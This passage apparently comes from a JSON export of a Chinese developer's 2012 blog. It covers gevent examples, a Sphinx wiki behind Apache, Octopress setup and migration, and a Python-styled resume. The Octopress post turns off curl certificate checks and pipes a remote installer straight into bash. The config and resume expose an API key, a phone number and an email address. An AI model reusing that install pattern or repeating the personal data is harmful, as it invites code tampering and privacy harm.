self.pool.spawn(self.listen, socket)</p>\n\n<p>    def shutdown(self):\n        self.pool.kill() #关闭pool\n</pre></p>\n\n<p><pre class=\"sh_python\">\nfrom gevent import sleep\nfrom gevent.pool import Pool\nfrom gevent.coros import BoundedSemaphore</p>\n\n<p>sem = BoundedSemaphore(2) #设定对共享资源的访问数量</p>\n\n<p>def worker1(n):\n    sem.acquire() #获取资源\n    print('Worker %i acquired semaphore' % n)\n    sleep(0)\n    sem.release()  #释放资源\n    print('Worker %i released semaphore' % n)</p>\n\n<p>def worker2(n):\n    with sem: #使用with关键字\n        print('Worker %i acquired semaphore' % n)\n        sleep(0)\n    print('Worker %i released semaphore' % n)</p>\n\n<p>pool = Pool()\npool.map(worker1, xrange(0,2)) \npool.map(worker2, xrange(3,6))\n</pre>\n执行结果:</p>\n\n<p>[root@248_STAT ~]# python test.py\nWorker 0 acquired semaphore\nWorker 1 acquired semaphore  #因为pool能容纳这2个请求,所以同时获取,再释放\nWorker 0 released semaphore\nWorker 1 released semaphore\nWorker 3 acquired semaphore #因为只能接收2个,那么5就要到下一轮\nWorker 4 acquired semaphore\nWorker 3 released semaphore\nWorker 4 released semaphore\nWorker 5 acquired semaphore\nWorker 5 released semaphore</p>\n\n<p>一个gevent教材上面说过的ping pong的那个协程例子的另一个实现:\n<pre class=\"sh_python\">\nimport gevent\nfrom gevent.queue import Queue\nfrom gevent import Greenlet</p>\n\n<p>class Actor(gevent.Greenlet): #自定义actor类</p>\n\n<p>    def __init__(self):\n        self.inbox = Queue() #收件箱作为一个队列\n        Greenlet.__init__(self) </p>\n\n<p>    def receive(self, message): \n        raise NotImplemented() #内置常量,表面意为没有实施</p>\n\n<p>    def _run(self): #\n        self.running = True</p>\n\n<p>        while self.running:\n            message = self.inbox.get() #获取队列数据\n            self.receive(message)</p>\n\n<p>class Pinger(Actor):\n    def receive(self, message): #重写方法\n        print message\n        pong.inbox.put('ping') #当获取收件箱有数据,获取数据,再放入数据(注意:是ping中放pong数据),其中pong是一个局部变量,它是Ponger的实例,以下的同理\n        gevent.sleep(0)</p>\n\n<p>class Ponger(Actor):\n    def receive(self, message):\n        print message\n        ping.inbox.put('pong')\n        gevent.sleep(0)</p>\n\n<p>ping = Pinger()\npong = Ponger()</p>\n\n<p>ping.start()\npong.start()</p>\n\n<p>ping.inbox.put('start') #最开始都是阻塞的,给一个触发\ngevent.joinall([ping, pong])\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><code data-result=\"[object Object]\"></code></p>\n",
    "date": {
      "year": "2012",
      "month": "July",
      "day": "26"
    }
  },
  {
    "id": 248,
    "title": "使用sphinx和apache搭建wiki文档网站",
    "category": "python",
    "tags": [
      "sphinx"
    ],
    "url": "/archives/shiyongsphinxheapachedajianwikiwendangwangzhan/",
    "content": "<p>前言：sphix是一个允许开发人员以纯文本格式使用reStructuredText 标记语法编写文档，自定义显示效果的文档工具。比较有代表性的网站有<a href=\"http://docs.python.org\" target=\"_blank\">python的docs官网</a>，<a href=\"http://book.42qu.com\" target=\"_blank\">张沈鹏的42区</a>等等，没事我在内网弄个记录一些工作文档。</p>\n\n<p>注：我这里使用了gentoo系统</p>\n\n<p><strong>1  安装sphinx和apache2</strong></p>\n\n<p>因为还有个同名的大名鼎鼎的sphinx搜索引擎，需要指定到类型：</p>\n\n<p>sudo emerge dev-python/sphinx apache2\n<strong>2 配置一个wiki站点</strong></p>\n\n<p>dongwm@localhost ~ $sphinx-quickstart  # 使用这个命令快速创建</p>\n\n<p>&gt; Root path for the documentation [.]:    test #过程中会有一些提示选项，根据你的需要定制，我对所有的疑问都是yes，注意这步，是问你这个配置的站点的root目录，我这里是一个新的test子目录目录，在家目录下\n完成后会出现test目录，包含这样的内容：</p>\n\n<p>dongwm@localhost ~/test $ ls -l\ntotal 24\ndrwxr-xr-x 4 dongwm dongwm 4096 Sep 14 13:38 build  #最后生成的html文件目录\n-rw-r--r-- 1 dongwm dongwm 5113 Sep 14 13:37 make.bat #我想是windows下的make\n-rw-r--r-- 1 dongwm dongwm 5589 Sep 14 13:37 Makefile #这个大家都熟悉\ndrwxr-xr-x 4 dongwm dongwm 4096 Sep 14 13:38 source  #源文件就是我们要编辑的wiki显示的代码的源文件目录</p>\n\n<p><strong>3 修改要显示的源文件</strong>\n原理：修改source下面的XXX.rst(或者你定义的其他后缀文件)，最后会生成同名的html文件，比如编辑index.rst会生成index.html，这个也就是默认的主显文件，通过他链接到其他文档处</p>\n\n<p><strong>4 生成html文件目录</strong>\ndongwm@localhost ~/test $  make html</p>\n\n<p>这样就会在build/html目录下生成html文件，当然你也自定义</p>\n\n<p><strong>5 设置apache以及htaccess</strong></p>\n\n<p>修改/etc/apache2/vhosts.d/default_vhost.include</p>\n\n<p>DocumentRoot \"/home/dongwm/test/build/html\"  12行 其中/home/dongwm/test/build/html就是生成html的目录，我就使用了默认的</p>\n\n<p>&lt;Directory \"/home/dongwm/test/build/html\"&gt;  15行</p>\n\n<p>在/home/dongwm/test/build/html目录，也就是网站根目录添加新文件.htaccess</p>\n\n<p>dongwm@localhost ~/test/build/html $ cat !$\ncat .htaccess\n&lt;Files ~ \"^.(htaccess|htpasswd)$\"&gt;\ndeny from all\n&lt;/Files&gt;\nOptions -Indexes\n&lt;FilesMatch \".(gif|jpg|jpeg|png|ico)$\"&gt;\nHeader set Cache-Control \"max-age=86400\"  #静态图片缓存24小时\n&lt;/FilesMatch&gt;\nAuthUserFile /home/dongwm/.htpasswd  #密码验证文件使用htpasswd生成\nAuthGroupFile /dev/null\nAuthName \"Please enter your ID and password\"\nAuthType Basic\nrequire valid-user\norder deny,allow\nallow from 10.28.101.1/24  #只容许这个段的人访问\ndeny from all</p>\n\n<p>dongwm@localhost ~/test $ sudo /etc/init.d/apache2 restart  #重启apache2</p>\n\n<p><strong>6 显示中文</strong></p>\n\n<p>修改source/conf.py其中的language=\"zh_CN\" 重新make html即可</p>\n\n<p><strong>7 技巧</strong></p>\n\n<p>1 快速开发</p>\n\n<p>每次我们修改了rst的源文件还需要make html去生成html文件，操作很麻烦，我在使用sublime_text2编辑器，写一个自定义编译程序的build，然后在Tools-&gt;Build System里面选择这个程序，</p>\n\n<p>比如：dongwm@localhost ~ $ cat ~/.config/sublime-text-2/Packages/User/makehtml.sublime-build  #一定要保存在这个目录，这个命令就是makehtml（去掉文件的.sublime-build后缀）\n{\n\"cmd\": [\"make\", \"html\"], #我要执行make html  每个参数都要用引号隔开\n\"working_dir\": \"${project_path:${folder}}\"  #他的语法大家可以去看官方文档，这里表示执行这个命令实在我当前的工作目录\n}</p>\n",
    "date": {
      "year": "2012",
      "month": "September",
      "day": "13"
    }
  },
  {
    "id": 249,
    "title": "使用octopress作为github.com网站的博客框架",
    "category": "ruby",
    "tags": [
      "github",
      "octopress"
    ],
    "url": "/archives/shiyongoctopresszuoweigithub-comwangzhandebokekuangjia/",
    "content": "<p>前言:使用ruby写的开源octopress越来越受到欢迎,并且因为github.com,很多作者把blog放在其二级域名上面,使用了它.国内也有很多人使用,比如mrzhang.me,其作者的主题还是不错滴,最近在华蟒python邮件组一封招聘邮件,里面竟然其中有一条:* 有github账号，开源项目和octpress的blog(但是职位是python的web开发,我很囧)</p>\n\n<p><strong>1 安装前准备:</strong></p>\n\n<p>假设你有github帐号,利用github提供的一个特性,使用key实现ssh信任链接</p>\n\n<p>ssh-keygen -t dsa\ncat ~/.ssh/id_dsa.pub#把其中的数据粘贴到github上面,这个就不说了</p>\n\n<p><strong>2 使用rvm:</strong>\necho insecure &gt;&gt; ~/.curlrc\ncurl -k https://raw.github.com/wayneeseguin/rvm/master/binscripts/rvm-installer | bash -s stable #ruby版本管理,类似于python的pythonbrew\nexport PATH=$PATH:/home/dongwm/.rvm/bin #或者直接写到profile\nrvm list known #列出已知的ruby #本来我使用的ruby是1.8的 但是这个框架需要1.9.2以上?\nruby 1.8.7 (2011-06-30 patchlevel 352) [i686-linux]\ndongwm@dongwm ~ $ rvm install 1.9.3 #安装ruby1.9.3</p>\n\n<p>git clone git://github.com/imathis/octopress.git dongwm.github.com  #下载octopress源码\ndongwm@dongwm ~ $ rvm  --create use 1.9.3@dongwm.github.com #使用ruby1.9.3\nUsing /home/dongwm/.rvm/gems/ruby-1.9.3-p194 with gemset dongwm.github.com\nRunning /home/dongwm/.rvm/hooks/after_use</p>\n\n<p>dongwm@dongwm ~ $ cd dongweiming.github.com/  #第一次切换到这个放置octopress目录时会提示你以下信息\nDo you wish to trust this .rvmrc file? (/home/dongwm/dongwm.github.com/.rvmrc)\ny[es], n[o], v[iew], c[ancel]&gt; y  #选择 y  以后就不在问你了</p>\n\n<p><strong>3 使用bundle管理项目中所有gem依赖</strong></p>\n\n<p>dongwm@dongwm ~/dongwm.github.com $ gem install bundler</p>\n\n<p>dongwm@dongwm ~/dongwm.github.com $ bundle install #安装需要的gem依赖</p>\n\n<p><strong>4 安装主题,假如我们不想用默认的主题</strong></p>\n\n<p>dongwm@dongwm ~/dongwm.github.com $ git clone git://github.com/bkutil/bootstrap-theme.git .themes/bootstrap-theme\n#git clone git://github.com/sevenadrian/foxslide .themes/foxslide\n#git clone git://github.com/barmstrong/octopress-bootstrap.git .themes/octopress-bootstrap\ndongwm@dongwm ~/dongwm.github.com $ rake install['foxslide'] #安装主题,默认主题rake install\ndongwm@dongwm ~/dongwm.github.com $ rake generate #生成模板文件</p>\n\n<p>注:每次换主题其实就是下载git源码+rake install + rake generate</p>\n\n<p><strong>5 可选 代码预览</strong></p>\n\n<p>假如测试环境想预览效果可以使用rake preview</p>\n\n<p><strong>6 部署代码到github</strong></p>\n\n<p>dongwm@dongwm ~/dongwm.github.com $ rake setup_github_pages  #设置链接\nEnter the read/write url for your repository\n(For example, 'git@github.com:your_username/your_username.github.com)\nRepository url: git@github.com:dongweiming/dongweiming.github.com  这里的dongweiming是我的帐号名字,后面的dongweiming.github.com是我的源,也就是github创建的源的名字,需要你手动在github网站增加,其实也是最后项直接访问的网站名字 以后访问 http://dongweiming.github.com\ndongwm@dongwm ~/dongwm.github.com $ rake deploy #部署到github</p>\n\n<p>当你看到“Github Pages deploy complete”后，就表示done,可以访问了</p>\n\n<p><strong>7 版本控制</strong></p>\n\n<p>既然是github,不用git就搞笑了</p>\n\n<p>dongwm@dongwm ~/dongwm.github.com $ 832  cd source/_posts/ #因为在添加文章之类都会在source/_posts目录下面增加相应的文件,那么我要备份这个目录,也就是使用版本控制\ndongwm@dongwm ~/octopress/source/_posts $ git init #初始化\ndongwm@dongwm ~/octopress/source/_posts $ touch README.md\ndongwm@dongwm ~/octopress/source/_posts $  git add *\ndongwm@dongwm ~/octopress/source/_posts $ git commit -m 'First version'</p>\n\n<p>dongwm@dongwm ~/octopress/source/_posts $ git remote add dongwm git@github.com:dongweiming/dongweiming.github.com.git</p>\n\n<p>这个意思就是 我添加了一个叫做'dongwm'的远程快捷方式,他链接到dongweiming帐号的dongweiming.github.com项目</p>\n\n<p>dongwm@dongwm ~/octopress/source/_posts $ git checkout -b backup #创建一个分支叫做backup\nSwitched to a new branch 'backup'\ndongwm@dongwm ~/octopress/source/_posts $ git push dongwm backup #将修改push到backup分支,这样就实现了对这个目录的控制\nCounting objects: 3, done.\nWriting objects: 100% (3/3), 213 bytes, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nTo git@github.com:dongweiming/dongweiming.github.com.git\n* [new branch]      backup -&gt; backup</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "September",
      "day": "26"
    }
  },
  {
    "id": 250,
    "title": "迁移octpress,Rakefile修改以及豆瓣推荐,豆瓣收藏秀,新浪微博分享按钮等实现",
    "category": "ruby",
    "tags": [
      "ruby",
      "octopress"
    ],
    "url": "/archives/qian-yi-octpressyi-ji-zi-ding-yi/",
    "content": "####*前言*\n\n首先感谢吴钊的[inove](http://www.neoease.com/inove),从博客建立就一直用它,昨天就开始研究迁移成octopress,以下是一些经验和总结\n\n####1. octopress目录结构说明\n\n#####首先看git出来的octopress目录结构:\n\n```\n├─ config.rb  #指定额外的compass插件\n├─ config.ru  \n├─ Rakefile   #rake的配置文件,类似于makefile,这个我修改了一些内容\n├─ Gemfile    #bundle要下载需要的gem依赖关系的指定文件\n├─ Gemfile.lock  #这些gem依赖的对应关系,比如A的x本依赖于B的y版本,我也修改了\n├─ _config.yml  #站点的配置文件\n├─ public/  #在静态编译完成后的目录,网站只需要这个目录下的文件树\n├─ _deploy/  #deploy时候生成的缓存文件夹,和public目录一样\n├─ sass/  #css文件的源文件,过程中会compass成css\n├─ plugins/  #放置自带以及第三方插件的目录,ruby程序\n│  └── xxx.rb\n└─ source/  #这个是站点的源文件目录,public目录就是根据这个目录下数据生成的\n   └─ _includes/\n      └─ custom/  #自定义的模板目录,被相应上级html include\n         └─ asides/  #边栏模板自定义模板目录\n      └─ asides/  #边栏模板目录\n      └─ post/  #文章页面相应模板目录\n   └─ _layouts/  #默认网站html相关文件,最底层\n   └─ _posts/  #新增以及从其它程序迁移过来的数据都存在这里\n   └─ stylesheets/ #css文件目录\n   └─ javascripts/  #js文件目录\n```\n<!-- more --> \n\n#####*我根据需要对它的修改*\n\n    1. Rakefile的修改\n\n```\n  editor = \"~/Sublime/sublime_text\" #设置编辑器\n  open(filename, 'w') do |post|\n    post.puts \"---\"\n    post.puts \"layout: post\"\n    post.puts \"title: \\\"#{title.gsub(/&/,'&amp;')}\\\"\"\n    post.puts \"date: #{Time.now.strftime('%Y-%m-%d %H:%M')}\"\n    post.puts \"comments: true\"\n    post.puts \"categories: \"\n    post.puts \"---\"\n    system \"sleep 1; #{editor} #{filename}\"  #增加这行,表示使用new_post后自动用我上面open设置的编辑器打开这个文件\n  end\nend\n```\n```\n  task :generate do\n  raise \"### You haven't set anything up yet. First run `rake install` to set up an Octopress theme.\" unless File.directory?(source_dir)\n  puts \"## Generating Site with Jekyll\"\n  system \"compass compile --css-dir #{source_dir}/stylesheets\"\n  system \"jekyll\"\n  cp_r \"#{source_dir}/.htaccess\", \"#{public_dir}\" #因为我的事wordpress迁移过来,其中图片目录需要重定向,所以使用.htaccess,但是默认不会自动拷贝\nend\n```\n    2. 一个问题:在我使用默认的pygments.rb对python高亮编码出现这个报错:\n\n```\n  /Could not open library 'lib.so': lib.so: cannot open shared object file: No such file or directory (LoadError)\n修改Gemfile.lock:\nrubypython (0.6.1)  #从0.5.3修改掉\n      blankslate (>= 2.1.2.3)\n      ffi (~> 1.0.7)\ngem uninstall rubypython\ngem install rubypython --version 0.6.1\ngem install pygments.rb\n```\n\n\n####2. 从wordpress主题inove迁移到octopress\n\n#####这里我只说一些我的思路,其它的具体步骤请参看其它文章,我这里假设你有linux shell\n\n    1.迁移网站文章\n\n因为涉及中文,我用的是[wordpressdotcom.rb](https://gist.github.com/1394128),然后我把我的网站程序导出,使用自带的xml方式,生成一个文件,把它重命名为:wordpress.xml放在当前目录,然后执行:\n\n```\ndongwm@dongwm ~/octopress $ ruby -r './wordpressdotcom.rb' -e 'Jekyll::WordpressDotCom.process' #wordpressdotcom.rb文件路径要正确\n```\n\n这样就会在source/_post下生成你的文章内容,都是html文件类型\n\n    2. 对这些文章文件修改\n\nPS:因为wordpress都是使用插件支持高亮,并且p,pre很泛滥,比如我这里用过的高亮方式:\n```\n<p>[codesyntax lang=\"python\"]\nCODE\n```\n\n```\n[cceW_bash width=”99%” height=”100%”]CODE\n[/cceW_bash]\n```\n\n而我在octopress使用的是[SHJS](shjs.sourceforge.net),它的语法是:\n\n```\n<pre class=\"sh_python\"></pre> #其中X语言就是sh_X\n```\n\n因为我有自己的独特性 我使用了如下shell程序完成修改,大家可以参照\n\n```\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/<\\/pre>//g' {} \\;  #去掉</pre>\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/<pre>//g' {} \\; #去掉<pre>\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/\\[\\/codesyntax\\]/<\\/pre>/g' {} \\;  #把原来的修改成SHJS的</pre>\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/\\[\\/cceW_bash\\]/<\\/pre>/g' {} \\; #把原来的修改成SHJS的</pre>\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/\\[cceW_\\(.*\\) width=\\\"99\\%\\\" height=\\\"100\\%\\\"\\]/<pre class=\\\"sh_\\1\\\">/g' {} \\;  #根据原来的原来类型修改成SHJS的相应类型\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/\\[codesyntax lang=\\\"\\(.*\\)\\\"\\]/<pre class=\\\"sh_\\1\\\">/g' {} \\;\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i '/---/{x;s/^/./;/^\\.\\{2\\}$/{x;s/.*/indexer: true\\n---/;x};x;}' {} \\;\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/<\\/br>//g' {} \\;  #去掉相关<br>\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/<br>//g' {} \\;\ndongwm@dongwm ~/octopress $ find source/_posts -name \"*.html\" -exec sed -i 's/<br \\/>//g' {} \\;\n```\n\n    3. 去掉twitter相关显示\n\n因为我使用SHJS,需要在页面加载完毕后显示效果,但是因为'墙'造成其一直加载,所以只能在相关页面去掉:\n修改_config.yml\n\n```\n# Twitter\ntwitter_user: dongweiming\ntwitter_tweet_count: 4\ntwitter_show_replies: false\ntwitter_follow_button: false #变成\ntwitter_show_follower_count: false\ntwitter_tweet_button: false #变成\n```\n\n修改source/_includes/post/sharing.html 去掉twitter那一段判断\n\n    4. 修改head.html\n\n```\nwget http://shjs.sourceforge.net/css/sh_ide-anjuta.css\nmv sh_ide-anjuta.css source/stylesheets/\nwget http://shjs.sourceforge.net/sh_main.min.js\nwget http://shjs.sourceforge.net/lang/sh_python.min.js\nmv sh_python.min.js source/javascripts/\nmv sh_main.min.js source/javascripts/\nwget http://blog.neten.de//javascripts/jimdoclockzip.js\n```\n\n修改原始页面增加加载后显示高亮,source/_layouts/default.html\n\n```\n{% capture root_url %}{{ site.root | strip_slash }}{% endcapture %}\n{% include head.html %}\n<body {% if page.body_id %} id=\"{{ page.body_id }}\" {% endif %} {% if page.sidebar == false %} class=\"no-sidebar\" {% endif %} {% if page.sidebar == 'collapse' or site.sidebar == 'collapse' %} class=\"collapse-sidebar sidebar-footer\" {% endif %} onload=\"sh_highlightDocument('', '.js');\">\n```\n\n```\n<script type=\"text/javascript\" src=\"/javascripts/jimdoclockzip.js\"></script>\n<script type=\"text/javascript\" src=\"/javascripts/sh_python.min.js\"></script>\n<script type=\"text/javascript\" src=\"/javascripts/sh_main.min.js\"></script>\n<script type=\"text/javascript\" src=\"/javascripts/sh_bash.min.js\"></script>\n<link href=\"/stylesheets/sh_ide-anjuta.css\" rel=\"stylesheet\" type=\"text/css\">\n```\n其中包含了SHJS需要的js以及高亮显示的css,以及一个我网站的小玩笑-一个爱跑的时钟\n\n    5. 增加分类标签云\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\ngit clone https://github.com/alswl/octopress-category-list\n</pre></figure></notextile></div>\n相应的请看README\n\n    6. 增加导航栏\n默认的就是blog和archives,请看我修改后的source/_includes/custom/navigation.html\n\n```\n<ul class=\"nav\">\n  <li><a href=\"{{ root_url }}/\">博客主页</a></li>\n  <li><a href=\"{{ root_url }}/blog/archives\">文章列表</a></li>\n  <li><a href=\"{{ root_url }}/blog/categories/关于我\">关于</a></li>\n</ul>\n```\nPS:迁移后,网站结构变了,路径根据_config.yml设置修改,以下是我的根目录下的.htaccess:\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\nRewriteEngine On\n\nRewriteBase /\nRewriteRule \"^wp-content/uploads/(.*)\" http://www.dongwm.com/uploads/$1 [R=301,L,NC]  #主要自定义上传图片的路径\n</pre></figure></notextile></div>\n\n    7. 侧边栏显示豆瓣收藏,我自己弄了个页面:\n\nhttps://github.com/dongweiming/octopress-douban_favorite_show\n\n    8. 微博分享和豆瓣推荐\n\n我对于前端也不熟.这里主要是定位iframe,放一个html文件,html文件包含相应的显示图标和js点击链接按钮\n以下是我的source/_includes/post/sharing.html\n\n```\n  <div class=\"sharing\">\n  {% if site.weibo_share %}\n  <span>\n  <iframe\n    width=\"55\"\n    scrolling=\"no\"\n    height=\"66\"\n    frameborder=\"0\"\n    src=\n      \"http://hits.sinajs.cn/A1/weiboshare.html?url={{ site.url }}{{ page.url }}&amp;appkey=site.weiboapp&amp;type=1&amp;{% if site.weibo_uid %}ralateUid={{ site.weibo_uid }}&amp;{% endif %}language=zh_cn\" allowtransparency=\"true\">\n  </iframe>\n  {% endif %}\n  {% if site.douban_user %}\n  <iframe\n    width=\"55\"\n    scrolling=\"no\"\n    height=\"74\"\n    frameborder=\"0\"\n    src=\"/douban.html\">\n  </iframe>\n  </span> \n  {% endif %}\n  {% if site.google_plus_one %}\n  <div class=\"g-plusone\" data-size=\"{{ site.google_plus_one_size }}\"></div>\n  {% endif %}\n  {% if site.facebook_like %}\n    <div class=\"fb-like\" data-send=\"true\" data-width=\"450\" data-show-faces=\"false\"></div>\n  {% endif %}\n</div>\n  <hr style=\"border-bottom:1px dotted #bdbabd;height:1px;border-top:0px;border-left:0px;border-right:0px;\" />\n```\n其中douban.html:\n\n```bash\n<a href=\"javascript:void(function(){var d=document,e=encodeURIComponent,s1=window.getSelection,s2=d.getSelection,s3=d.selection,s=s1?s1():s2?s2():s3?s3.createRange().text:'',r='http://www.douban.com/recommend/?url='+e(d.location.href)+'&title='+e(d.title)+'&sel='+e(s)+'&v=1',x=function(){if(!window.open(r,'douban','toolbar=0,resizable=1,scrollbars=yes,status=1,width=450,height=330'))location.href=r+'&r=1'};if(/Firefox/.test(navigator.userAgent)){setTimeout(x,0)}else{x()}})()\" ><img src=\"/douban.png\" width=35 height=35 alt=\"推荐到豆瓣\" /></a>\n```\n\n    9. 我的_config.yml文件:\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\n# ----------------------- #\n#      Main Configs       #\n# ----------------------- #\n\n\nurl: http://www.dongwm.com\ntitle: 小明明s à domicile\nsubtitle: 沉浸于linux艺术（首先是态度，然后再是技术）\nauthor: Dongweiming\nsimple_search: http://google.com/search\ndescription:\n\n# Default date format is \"ordinal\" (resulting in \"July 22nd 2007\")\n# You can customize the format as defined in\n# http://www.ruby-doc.org/core-1.9.2/Time.html#method-i-strftime\n# Additionally, %o will give you the ordinal representation of the day\ndate_format: \"ordinal\"\n\n# RSS / Email (optional) subscription links (change if using something like Feedburner)\nsubscribe_rss: /atom.xml\nsubscribe_email:\n# RSS feeds can list your email address if you like\nemail:\n\n# ----------------------- #\n#    Jekyll & Plugins     #\n# ----------------------- #\n\n# If publishing to a subdirectory as in http://site.com/project set 'root: /project'\nroot: /\npermalink: /archives/:title/\nsource: source\ndestination: public\nplugins: plugins\ncode_dir: downloads/code\ncategory_dir: blog/categories  \ncategory_title_prefix: \"分类: \"\nmarkdown: rdiscount\npygments: True # default python pygments have been replaced by pygments.rb\n\npaginate: 10          # Posts per page on the blog index\npagination_dir:  # Directory base for pagination URLs eg. /blog/page/2/\nrecent_posts: 5       # Posts in the sidebar Recent Posts section\nexcerpt_link: \"继续阅读 &rarr;\"  # \"Continue reading\" link text at the bottom of excerpted articles\n\ntitlecase: true       # Converts page and post titles to titlecase\n\ndefault_asides: [asides/recent_posts.html,  asides/github.html, asides/delicious.html, asides/pinboard.html, asides/googleplus.html,custom/asides/category_cloud.html, custom/asides/douban.html, asides/article_total_sidebar.html]\n\npage_asides: [custom/asides/indexer.html]\narticle_total: true\narticle_total_title: 文章统计\narticle_my_site_has: 本站共有\narticle_my_site_article : 篇文章\narticle_total_sidebar: true\n\n# ----------------------- #\n#   3rd Party Settings    #\n# ----------------------- #\n\n#QQ\nqq_share: true\n\n#Douban\ndouban_user: 62943420\ndouban_people: 小明明\ndouban_apikey: 0ec15d10bdd1901a2c4417323974b04e\ndouban_show:  #dolist,wishlist,collection \ndouban_display_category: book|music #''(book music blog movie) format: movie|book|music\ndouban_display: random #favorite and ''(new add)\ndouban_total_show: 10\ndouban_percolumn: 2\ndouban_img_style: medium #''(small)\ndouban_hidelogo: true #''(false)\ndouban_hideself:  true #''(false)\n\n# Weibo\nweibo_uid: 1994497175\nweibo_verifier: abd54ad9\nweibokey: 2642268232\nweibo_fansline: 0 \nweibo_show: true \nweibo_pic: true \nweibo_skin: 10 \nweibo_share: true \n\n# Github repositories\ngithub_user: dongweiming\ngithub_repo_count: 0\ngithub_show_profile_link: true\ngithub_skip_forks: true\n\n# Twitter\ntwitter_user: dongweiming\ntwitter_tweet_count: 4\ntwitter_show_replies: false\ntwitter_follow_button: false\ntwitter_show_follower_count: false\ntwitter_tweet_button: false\n\n</pre></figure></notextile></div>\n\n\n    10. 我下一步的想法:\n时间太短,没来得及做一些工作,节后我准备\n        - 写个第三方分类插件bootstrap-theme\n        - 写个第三方相关分享按钮的插件\n        - 写个第三方相关登录的插件\n        - 研究bootstrap-theme,对其进行一些修改和更新\n",
    "date": {
      "year": "2012",
      "month": "September",
      "day": "28"
    }
  },
  {
    "id": 251,
    "title": "python版个人简历",
    "category": null,
    "tags": [
      "python",
      "resume"
    ],
    "url": "/archives/pythonban-ge-ren-jian-li/",
    "content": "####*前言*\n\n最近换工作,无聊之下搞了个python版本的简历,包含我的相应信息,以及使用了一个装饰器用来显示颜色和相应块信息.并上传到gist.github.com\n\n#####代码如下(隐藏了个人信息用'XXX'代替)\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n#/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport random\nimport re\n\n\ndef color(messages):\n    color = \"\\x1B[%d;%dm\" % (1, random.randint(30,37))\n    return \"%s %s\\x1B[0m\" % (color, messages)\n\ndef colorprint(mes, flag=True):\n    def _mydecorator(func):\n        def _mydecorator(*args):\n            res = func(*args)\n            print color(mes+\":\"),\"\\n\"\n            if flag:\n                for k1, v1 in res.items():\n                    if not isinstance(v1, dict):\n                        print \"{0}: {1}\".format(k1.rjust(16), v1)\n                    else:\n                        print \"{0}:\".format(k1.rjust(16))\n                        for k2, v2 in v1.items():\n                            print \"{0}: {1}\".format(k2.rjust(20), v2)\n            else:\n                for i in res:\n                    if not isinstance(i[1], dict):\n                        print i\n                    else:\n                        for k, v in i[1].items():\n                            print \"{0}[{1}]: {2}\".format(k.rjust(16), \\\n                    i[0], v)\n            return res\n        return _mydecorator\n    return _mydecorator\n\nclass ForJob(object):\n\n    def __str__(self):\n        return color(\"XXX的python简历\".center(400))\n\n    @property\n    @colorprint(\"个人信息\")\n    def personal_information(self):\n        return {\n          \"Name\" : \"XXX\",\n                  \"Gender\" : \"Male\",\n                  \"Born\" : ['19XX', 'X', 'X'],\n          \"Education\" : {\n              \"School Name\" : \"保定科技职业学院\",\n              \"Major\" : \"烹饪工艺与营养\",\n              \"Degree\" : \"Three-year college\",\n              \"Graduation\" : 2009},\n                  \"QQ\" : 61966225,\n          \"Tel\" : 13552651322,\n          \"Email\" : \"ciici1234@hotmail.com\",\n          \"Target Positions\" : re.compile(\"'Python Developer'|Architect|DevOps\",re.I|re.M).pattern}\n        \n    @property\n    @colorprint(\"个人特点\")\n    def characteristics(self):\n        return {\n            \"心里承受能力强\" : \"从非计算机专业―思科方向\\\n―linux运维―C/python开发\",\n            \"对计算机技术的热衷和喜爱\" : \"正是因为喜欢IT,\\\n我才会放弃大学专业\",\n            \"自学能力强\" : \"没有大学的计算机基础除思科参加培训，\\\n其它都为都是自学\",\n            \"毅力和耐性\" : \"从不放弃一个解决不了的难题，\\\n看过的计算机专业技术多于700页的书籍>30本\",\n            \"is_geek\" : True}\n\n    @property\n    @colorprint(\"个人能力\")\n    def skills(self):\n        return {\n            \"Language\" : {\n                \"熟悉\" : [\"Python\", \"Ruby\", \"Bash\", \"c\"],\n                \"了解\" : [\"Haskell\", \"Lisp\", \"Erlang\"]},\n            \"OS\" : [\"Gentoo\", \"Debian\", \"Centos/Rhel\", \"Opensuse\"],\n            \"Tool\" : [\"Vim\", \"Mercurial\", \"Git\"],\n            \"Databaseandtools\" : [\"Mysql\",\n                \"Postgresql\", \"Mongodb\", \"Redis\", \"Memcached\", \"Sqlalchemy\"],\n            \"WebFramework\" : {\n                \"熟悉\" : [\"Tornado\", \"Django\", \"Gae\"],\n                \"了解\" : [\"Flask\"]},\n            \"OtherFramework\" : [\"Twisted\", \"gevent\",\n               \"stackless\", \"scrapy\", \"mechanize\"],\n            \"GUI\" : \"pyqt\",\n            \"Network\" : \"Cisco Certified Security Professional\",\n\"Other\" : \"给gentoo和centos提交过bug\"}\n\n    @property\n    @colorprint(\"工作经验\",False)\n    def work_experience(self):\n        return enumerate([\n            {\n                \"Time period\" : \"2009.09-2011.08\",\n                \"Company Name\" : \"XXX（北京）科技股份有限公司\",\n                \"Position\" : \"高级运维工程师\"},\n            {\n                \"Time period\" : \"2011.09-2012.08\",\n                \"Company Name\" : \"北京XXX有限责任公司\",\n                \"Position\" : \"linux python研发工程师\"}])\n\n    @property\n    @colorprint(\"项目经验\",False)\n    def project_experience(self):\n        return enumerate([\n            {\n                \"Project\" : \"kvm远程管理系统\",\n\"Description\" : \"前台(django)接手至其它同事并完成维护，\\\n后台独立完成，用来创建，修改，删除kvm，查看状态信息等\"},\n            {\n                \"Project\" : \"postfix群发邮件系统\",\n\"Description\" : 